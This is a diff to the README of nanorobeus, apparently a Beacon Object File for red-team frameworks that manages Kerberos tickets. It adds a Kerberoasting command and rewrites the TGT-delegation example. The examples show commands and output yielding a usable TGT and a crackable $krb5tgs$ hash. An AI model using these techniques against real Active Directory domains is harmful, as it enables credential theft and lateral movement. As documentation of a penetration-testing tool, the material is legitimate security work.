@@ -20,7 +20,9 @@ COFF file (BOF) for managing Kerberos tickets.
 
 **purge** *[/luid <0x0>]* - purge Kerberos tickets
 
-**tgtdeleg** *\<spn\> [\<enc_type_hex\>]* - retrieve a usable TGT for the current user
+**tgtdeleg** *\<spn\>* - retrieve a usable TGT for the current user
+
+**kerberoast** *\<spn\>* - perform Kerberoasting against specified SPN
 
 ## Examples
 Get current logon ID.
@@ -114,31 +116,25 @@ Purge all Kerberos tickets from the current logon session. When elevated, use `/
 
 [+] Successfully purged tickets.
 ```
-Retrieve a usable TGT for the current user. First, retrieve AP-REQ blob.
+Retrieve a usable TGT for the current user.
 ```
-=> nanorobeus64 tgtdeleg cifs/dc.fortress.local
+=> nanorobeus64 tgtdeleg cifs/server.fortress.local
 
-[+] AP-REQ blob: YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)...
+[*] Found the AP-REQ delegation ticket in the GSS-API output
+[*] Authenticator etype: AES256_CTS_HMAC_SHA1
+[*] Successfully extracted the service ticket session key
+[*] Successfully decrypted authenticator
+[+] Successfully extracted TGT: doIFeDCCBXSgAwIBBaEDAgEWooIEcjC...(snip)...
 ```
-Then determine an encryption type.
+Perform Kerberoasting by specifying SPN:
 ```
-$ TgtDeleg.exe YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)...
-[*] Authenticator etype: 0x12 (aes256_cts_hmac_sha1)
-```
-Retrieve a session key.
-```
-=> nanorobeus64 tgtdeleg cifs/dc.fortress.local 0x12
+=> nanorobeus64 kerberoast HTTP/server.fortress.local
 
-[*] Encryption: AES256_CTS_HMAC_SHA1
-[+] Session key: 1/0kOhaO+7bRVPUABp0q4IFazZDc2l3GOcWYTuL/bDk=
-```
-Finally, specify the session key and retrieve a usable TGT ticket.
-```
-$ TgtDeleg.exe YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)... 1/0kOhaO+7bRVPUABp0q4IFazZDc2l3GOcWYTuL/bDk=
-[*] Authenticator etype: 0x12 (aes256_cts_hmac_sha1)
-[*] Ticket: doIFeDCCBXSgAwIBBaEDAgEWooIEcjCCBG5hggRqMIIEZq...(snip)...
+[*] Target SPN: HTTP/server.fortress.local
+[+] Hash: $krb5tgs$23$*$FORTRESS.LOCAL$HTTP/server.fortress.local*$ac5e2f4d28fd377...(snip)...
 ```
 
 ## Credits
 * Rubeus - https://github.com/GhostPack/Rubeus
 * mimikatz - https://github.com/gentilkiwi/mimikatz
+* kekeo - https://github.com/gentilkiwi/kekeo 
